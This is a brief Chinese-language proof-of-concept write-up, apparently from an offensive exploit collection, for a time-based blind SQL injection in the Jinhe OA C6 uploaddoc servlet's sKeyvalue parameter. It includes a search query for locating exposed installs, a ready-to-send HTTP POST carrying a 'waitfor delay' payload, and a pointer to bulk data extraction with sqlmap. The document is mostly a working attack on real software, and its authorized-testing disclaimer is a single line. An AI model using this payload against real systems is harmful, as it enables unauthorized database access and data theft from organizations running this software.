---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA uploaddoc SQL注入漏洞

## 漏洞描述

金和OA C6 `/jc6/servlet/uploaddoc` 接口 `sKeyvalue` 参数存在 SQL 注入漏洞（SQL Server 延时盲注）。

## 影响版本

```
金和OA C6
```

## 网络测绘

```
app="金和OA"
```

## 漏洞复现

```
POST /jc6/servlet/uploaddoc HTTP/1.1
Content-Type: application/x-www-form-urlencoded

sKeyvalue=1';waitfor delay '0:0:3'--&...
```

延时响应确认注入点后可用 sqlmap 批量提取。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
